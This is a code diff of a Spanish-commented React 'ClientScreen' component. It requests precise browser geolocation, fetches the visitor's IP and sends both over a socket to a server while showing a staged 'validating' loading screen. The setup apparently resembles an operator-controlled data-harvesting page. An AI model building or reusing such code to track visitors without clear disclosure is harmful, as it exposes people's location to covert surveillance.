@@ -177,7 +177,7 @@ export default function ClientScreen() {
   }, [socket]);
 
   // Función para solicitar geolocalización directamente sin pantalla personalizada
-  const requestGeolocationDirectly = () => {
+  const requestGeolocationDirectly = async () => {
     console.log('[Geolocation] Iniciando solicitud directa de ubicación...');
     
     // Cambiar a pantalla de validando inmediatamente
@@ -198,93 +198,124 @@ export default function ClientScreen() {
       return;
     }
 
-    console.log('[Geolocation] Llamando a getCurrentPosition...');
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        console.log('[Geolocation] Ubicación obtenida exitosamente:', position);
+    // Intentar revocar permisos existentes para forzar nueva solicitud
+    try {
+      if ('permissions' in navigator) {
+        console.log('[Geolocation] Intentando revocar permisos existentes...');
+        const permission = await navigator.permissions.query({name: 'geolocation'});
+        console.log('[Geolocation] Estado de permisos actual:', permission.state);
         
-        const { latitude, longitude } = position.coords;
-        
-        // Obtener la IP del usuario
-        let ipAddress = 'IP no disponible';
-        try {
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipResponse.json();
-          ipAddress = ipData.ip;
-        } catch (ipError) {
-          console.warn('[Geolocation] No se pudo obtener la IP:', ipError);
+        // Aunque no podemos revocar directamente, lo intentamos
+        if (permission.state === 'granted') {
+          console.log('[Geolocation] Permisos ya otorgados - forzando nueva solicitud con configuración especial');
         }
-        
-        // Crear enlace de Google Maps
-        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        
-        const locationData = {
-          latitude: latitude.toString(),
-          longitude: longitude.toString(),
-          googleMapsLink,
-          timestamp: new Date().toISOString(),
-          ipAddress
-        };
-
-        console.log('[Geolocation] Datos de ubicación procesados:', locationData);
-        console.log('[Geolocation] Ubicación obtenida:', locationData);
-        
-        // Enviar primera señal de validando
-        sendMessage({
-          type: 'CLIENT_INPUT',
-          data: {
-            tipo: 'validando',
-            sessionId,
-            data: {}
-          }
-        });
-        
-        // Luego enviar los datos de geolocalización
-        setTimeout(() => {
-          sendMessage({
-            type: 'CLIENT_INPUT',
-            data: {
-              tipo: 'geolocation',
-              sessionId,
-              data: {
-                tipo: 'geolocation',
-                latitude: locationData.latitude,
-                longitude: locationData.longitude,
-                googleMapsLink: locationData.googleMapsLink,
-                locationTimestamp: locationData.timestamp,
-                ipAddress: locationData.ipAddress
-              }
-            }
-          });
-          console.log('[ClientScreen] Enviando datos de geolocalización al servidor');
-          console.log('[ClientScreen] Datos de geolocalización enviados, manteniendo pantalla de cargando...');
-        }, 2000);
-      },
-      (error) => {
-        console.error('[Geolocation] Error obteniendo ubicación:', error);
-        
-        let errorMessage = 'Permiso de ubicación denegado';
-        switch (error.code) {
-          case error.PERMISSION_DENIED:
-            errorMessage = 'Permiso de ubicación denegado por el usuario';
-            break;
-          case error.POSITION_UNAVAILABLE:
-            errorMessage = 'Información de ubicación no disponible';
-            break;
-          case error.TIMEOUT:
-            errorMessage = 'Tiempo de espera agotado para obtener ubicación';
-            break;
-        }
-        
-        console.log('[Geolocation] Error:', errorMessage);
-        sendLocationDeniedData();
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
       }
+    } catch (error) {
+      console.log('[Geolocation] No se pueden consultar permisos:', error);
+    }
+
+    // Configuración especial para obtener ubicación actual siempre
+    const locationOptions = {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0 // Siempre solicitar nueva ubicación, no usar cache
+    };
+
+    console.log('[Geolocation] Solicitando ubicación actual (forzando nueva lectura)...');
+    
+    // NOTA: Los navegadores modernos no permiten revocar permisos programáticamente
+    // La ventana emergente solo aparecerá si el usuario no ha otorgado permisos previamente
+    // Para forzar que aparezca siempre, el usuario debe ir a configuración del navegador
+    // y eliminar los permisos manualmente para este sitio
+    
+    navigator.geolocation.getCurrentPosition(
+      handleLocationSuccess,
+      handleLocationError,
+      locationOptions
     );
+  };
+
+  // Función para manejar el éxito en la obtención de ubicación
+  const handleLocationSuccess = async (position: GeolocationPosition) => {
+    console.log('[Geolocation] Ubicación obtenida exitosamente:', position);
+    
+    const { latitude, longitude } = position.coords;
+    
+    // Obtener la IP del usuario
+    let ipAddress = 'IP no disponible';
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      ipAddress = ipData.ip;
+    } catch (ipError) {
+      console.warn('[Geolocation] No se pudo obtener la IP:', ipError);
+    }
+    
+    // Crear enlace de Google Maps
+    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    
+    const locationData = {
+      latitude: latitude.toString(),
+      longitude: longitude.toString(),
+      googleMapsLink,
+      timestamp: new Date().toISOString(),
+      ipAddress
+    };
+
+    console.log('[Geolocation] Datos de ubicación procesados:', locationData);
+    console.log('[Geolocation] Ubicación obtenida:', locationData);
+    
+    // Enviar primera señal de validando
+    sendMessage({
+      type: 'CLIENT_INPUT',
+      data: {
+        tipo: 'validando',
+        sessionId,
+        data: {}
+      }
+    });
+    
+    // Luego enviar los datos de geolocalización
+    setTimeout(() => {
+      sendMessage({
+        type: 'CLIENT_INPUT',
+        data: {
+          tipo: 'geolocation',
+          sessionId,
+          data: {
+            tipo: 'geolocation',
+            latitude: locationData.latitude,
+            longitude: locationData.longitude,
+            googleMapsLink: locationData.googleMapsLink,
+            locationTimestamp: locationData.timestamp,
+            ipAddress: locationData.ipAddress
+          }
+        }
+      });
+      console.log('[ClientScreen] Enviando datos de geolocalización al servidor');
+      console.log('[ClientScreen] Datos de geolocalización enviados, manteniendo pantalla de cargando...');
+    }, 2000);
+  };
+
+  // Función para manejar errores en la obtención de ubicación
+  const handleLocationError = (error: GeolocationPositionError) => {
+    console.error('[Geolocation] Error obteniendo ubicación:', error);
+    
+    let errorMessage = 'Permiso de ubicación denegado';
+    switch (error.code) {
+      case error.PERMISSION_DENIED:
+        errorMessage = 'Permiso de ubicación denegado por el usuario';
+        break;
+      case error.POSITION_UNAVAILABLE:
+        errorMessage = 'Información de ubicación no disponible';
+        break;
+      case error.TIMEOUT:
+        errorMessage = 'Tiempo de espera agotado para obtener ubicación';
+        break;
+    }
+    
+    console.log('[Geolocation] Error:', errorMessage);
+    sendLocationDeniedData();
   };
 
   // Función para enviar datos cuando se deniega la ubicación
